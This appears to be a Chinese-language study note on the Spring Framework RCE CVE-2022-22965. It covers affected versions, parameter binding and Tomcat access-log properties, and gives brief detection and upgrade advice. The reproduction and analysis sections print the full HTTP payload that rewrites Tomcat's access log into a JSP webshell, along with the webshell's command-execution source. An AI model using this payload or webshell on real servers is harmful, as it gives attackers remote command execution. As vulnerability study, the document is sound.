# 1、漏洞概况与影响

## Spring生态体系

![image-20230423120755325](https://image.201068.xyz/assets/image-20230423120755325.png)

![image-20230423120806287](https://image.201068.xyz/assets/image-20230423120806287.png)

## 漏洞情况

2022年3月31日 

CVE-2022-22965 

https://spring.io/blog/2022/03/31/spring-framework-rce-early-announcement 

### 受影响范围： 

Spring Framework < 5.3.18 

Spring Framework < 5.2.20 

JDK ≥ 9 

### 不受影响版本：

 Spring Framework = 5.3.18 

Spring Framework = 5.2.20 

JDK < 9 

**与Tomcat版本有关**

## tomcat部分测试结果

![image-20230423120947607](https://image.201068.xyz/assets/image-20230423120947607.png)

# 2、基础知识

## Spring参数自动绑定

```
http://localhost:8083/addUser?name=wuya&department.name=sec
```

![image-20230423121216512](https://image.201068.xyz/assets/image-20230423121216512.png)

```
User.getDepartment()
	Department.setName()
```

## 多级参数绑定

```
参数名赋值：contry.province.city.district=yuelu

调用链路：
Contry.getProvince()
	Province.getCity()
		City.getDistrict( )
			District.setDistrictName()
```

## PropertyDescriptor

JDK自带： 

`Java Bean PropertyDescriptor` 

自动调用类对象的get/set方法

## BeanWrapperImpl

Spring自带： 

`BeanWrapperImpl` 

对Spring容器中管理的对象，自动调用get/set方法

## 思路

- 通过`Controller`的参数赋值（自动绑定）， 
- 可以修改任意对象的属性值 
- 改什么？ 
- ……

## Tomcat日志

![image-20230423121451623](https://image.201068.xyz/assets/image-20230423121451623.png)

## access_log属性

- directory： access_log文件输出目录 
- prefix： access_log文件名前缀 
- suffix： access_log文件名后缀 
- pattern： access_log文件内容格式 
- fileDateFormat：access_log文件名日期后缀，默认 为.yyyy-MM-dd 

`org.apache.catalina.valves.AccessLogValve` 对象

# 3、漏洞本地源码复现

## 环境

- 操作系统：Windows 
- JDK：11.0.11 
- Tomcat：9.0.60 
- SpringBoot：2.6.3（注意不使用内置Tomcat） 
- 把ROOT.war包放在tomcat/webapps目录下

## 准备内容

- ApplicationMain 
- UserController
- User 
- Department

## 部署到tomcat/webapps/ROOT

![image-20230423121748353](https://image.201068.xyz/assets/image-20230423121748353.png)

## 利用

```
exploit.py --url http://localhost:8080/addUser

http://192.168.70.13:8080/wuya.jsp?cmd=whoami
```

# 4、原理分析

## HTTP payload

```
class.module.classLoader.resources.context.parent.pipeline.first.pattern=%{c2}i if("j".equals(request.getParameter("pwd"))){ java.io.InputStream in = %{c1}i.getRuntime().exec(request.getParameter("cmd")).getInputStream(); int a = -1; byte[] b = new byte[2048]; while((a=in.read(b))!=-1){ out.println(new String(b)); } } %{suffix}i&class.module.classLoader.resources.context.parent.pipeline.first.suffix=.jsp&class.module.classLoader.resources.context.parent.pipeline.first.directory=webapps/ROOT&class.module.classLoader.resources.context.parent.pipeline.first.prefix=wuya&class.module.classLoader.resources.context.parent.pipeline.first.fileDateFormat="
```

```
<% java.io.InputStream in = Runtime.getRuntime().exec(request.getParameter("cmd")).getInputStream(); int a = -1; byte[] b = new byte[2048]; while((a=in.read(b))!=-1){ out.println(new String(b)); } %>//
```

## 参数描述

| 参数名                                                       | 参数值                                                       |
| ------------------------------------------------------------ | ------------------------------------------------------------ |
| `class.module.classLoader.resources.context.parent.pipeline.first.pattern` | `% { c 2 } i i f ( " j " . e q u a l s ( r e q u e s t . g e t P a r a m e t e r ( " p w d " ) ) ) { j a v a . i o . I n p u t S t r e a m i n = %{c1}i.getRuntime().exec(request.getParameter("cmd")).getIn putStream(); int a = -1; byte[] b = new byte[2048]; while((a=in.read(b))!=-1){ out.println(new String(b)); } }` |
| `class.module.classLoader.resources.context.parent.pipeline.first.suffix` | `.jsp`                                                       |
| `class.module.classLoader.resources.context.parent.pipeline.first.directory` | `webapps/ROOT`                                               |
| `class.module.classLoader.resources.conte xt.parent.pipeline.first.prefix` | `wuya`                                                       |
| `class.module.classLoader.resources.context.parent.pipeline.first.fileDateFormat` |                                                              |

`org.apache.catalina.valves.AccessLogValve` 对象

## 调用链

```
class.module.classLoader.resources.context.parent.pipeline.first.pattern

User.getClass()
java.lang.Class.getModule()
java.lang.Module.getClassLoader()
org.apache.catalina.loader.ParallelWebappClassLoader.getResources()
org.apache.catalina.webresources.StandardRoot.getContext()
org.apache.catalina.core.StandardContext.getParent()
org.apache.catalina.core.StandardHost.getPipeline()
org.apache.catalina.core.StandardPipeline.getFirst()
org.apache.catalina.valves.AccessLogValve.setPattern()
```

## User对象有什么属性？

**缓存了一个 Class属性**

![image-20230423122411971](https://image.201068.xyz/assets/image-20230423122411971.png)

## JSP木马

```
<%
if("j".equals(request.getParameter("pwd"))){
java.io.InputStream in =
Runtime.getRuntime().exec(request.getParameter("cmd")).getInp
utStream();
int a = -1;
byte[] b = new byte[2048];
while((a=in.read(b))!=-1){
out.println(new String(b));
		}
	}
%>
```

# 5、漏洞排查

## 排查思路

1. Spring 参数绑定功能 
2. JDK版本 9+ 
3. Tomcat部署方式及版本 
4. Tomcat Access功能 
5. 流量分析 
6. 日志分析

# 5、漏洞修复

## 漏洞修复

1. 升级Spring 
2. 升级Tomcat 
3. 安装安全产品，比如WAF